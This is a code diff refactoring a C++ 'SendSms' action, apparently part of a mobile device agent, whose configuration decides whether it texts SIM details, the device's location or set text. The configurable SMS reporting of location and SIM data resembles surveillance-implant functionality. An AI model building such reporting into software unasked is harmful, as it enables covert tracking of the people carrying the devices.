@@ -10,8 +10,9 @@ SendSms::SendSms(Configuration *c) : stopAction(FALSE) {
 }
 
 INT SendSms::run() {
-	wstring number, type;
+	wstring number, text;
 	Device *deviceObj = Device::self();
+	BOOL position, sim;
 
 	auto_ptr<Sms> sms(new(std::nothrow) Sms());
 
@@ -29,13 +30,24 @@ INT SendSms::run() {
 	}
 
 	try {
-		type = conf->getString(L"type");
+		position = conf->getBool(L"position");
 	} catch (...) {
-		DBG_TRACE(L"Debug - SendSms.cpp - No type set\n", 1, FALSE);
-		return 0;
+		position = FALSE;
 	}
 
-	if (type.compare(L"sim") == 0) {
+	try {
+		sim = conf->getBool(L"sim");
+	} catch (...) {
+		sim = FALSE;
+	}
+
+	try {
+		text = conf->getString(L"text");
+	} catch (...) {
+		text = L"";
+	}
+
+	if (sim) {
 		wstring text;
 		BOOL bRes;
 
@@ -50,7 +62,7 @@ INT SendSms::run() {
 		return bRes;
 	} 
 
-	if (type.compare(L"location") == 0) {
+	if (position) {
 		HANDLE smsThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SmsThread, (void*)conf, 0, NULL);
 
 		if (smsThread == NULL) {
@@ -61,7 +73,7 @@ INT SendSms::run() {
 		return 1;
 	}
 
-	if (type.compare(L"text") == 0) {
+	if (text.empty() == FALSE) {
 		wstring text;
 		BOOL bRes;
 
@@ -79,7 +91,7 @@ INT SendSms::run() {
 	}
 
 	DBG_TRACE(L"Debug - SendSms.cpp - *** We shouldn't be here!!!\n", 1, FALSE);
-	return 0;
+	return FALSE;
 }
 
 BOOL SendSms::getStop() {
